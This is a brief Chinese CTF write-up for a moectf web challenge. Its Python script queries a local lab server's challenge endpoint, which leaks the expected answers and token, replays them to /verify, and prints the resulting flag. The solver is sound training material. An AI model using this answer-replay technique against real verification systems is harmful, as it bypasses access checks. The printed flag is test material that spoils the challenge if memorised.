# 摸金偶遇FLAG，拼尽全力难战胜
```py
import requests
import json

# 目标URL（根据实际地址调整）
BASE_URL = "http://127.0.0.1:61996"

def get_flag():
    # 1. 创建会话保持状态（关键：维持挑战会话）
    session = requests.Session()
    
    try:
        # 2. 模拟访问首页，初始化会话（部分服务器要求先加载页面）
        session.get(f"{BASE_URL}/")  # 确保会话被服务器识别
        
        # 3. 获取挑战数据（包含正确密码和token）
        challenge_url = f"{BASE_URL}/get_challenge?count=9"
        response = session.get(challenge_url)
        response.raise_for_status()  # 检查请求是否成功
        challenge_data = response.json()
        
        # 提取关键数据
        numbers = challenge_data.get("numbers")
        token = challenge_data.get("token")
        
        if not numbers or not token:
            print("获取挑战数据失败：缺少numbers或token")
            print("响应内容：", challenge_data)  # 打印完整响应排查错误
            return
        
        print(f"获取到正确密码：{numbers}")
        print(f"获取到token：{token}")
        
        # 4. 模拟"开始挑战"（部分服务器要求必须触发开始动作）
        # 若服务器校验挑战状态，需发送开始请求（根据前端逻辑）
        start_url = f"{BASE_URL}/start_challenge"  # 假设的开始接口，需根据实际调整
        try:
            session.post(start_url, data={"token": token})
        except Exception as e:
            print(f"忽略开始挑战接口错误（非必需）：{e}")
        
        # 5. 提交验证（使用会话保持认证状态）
        verify_url = f"{BASE_URL}/verify"
        payload = {
            "answers": numbers,  # 正确密码
            "token": token       # 必须携带token
        }
        headers = {"Content-Type": "application/json"}
        verify_response = session.post(
            verify_url,
            data=json.dumps(payload),  # 显式序列化确保格式正确
            headers=headers
        )
        verify_response.raise_for_status()  # 检查验证请求状态
        verify_result = verify_response.json()
        
        # 6. 提取flag
        if verify_result.get("correct"):
            flag = verify_result.get("flag")
            print(f"成功获取flag：{flag}")
            return flag
        else:
            print(f"验证失败：{verify_result.get('message', '未知错误')}")
            print("验证响应详情：", verify_result)
    
    except requests.exceptions.HTTPError as e:
        print(f"HTTP错误：{e}")
        # 打印响应内容辅助排查（关键：查看服务器返回的具体原因）
        if hasattr(e.response, 'text'):
            print("服务器返回内容：", e.response.text)
    except requests.exceptions.RequestException as e:
        print(f"网络请求错误：{e}")
    except json.JSONDecodeError:
        print("解析JSON响应失败")
    except Exception as e:
        print(f"其他错误：{e}")

if __name__ == "__main__":
    get_flag()
```
获得flag为`moectf{813ed15e-3c13-9a71-e3af-8d1029f9d45f}`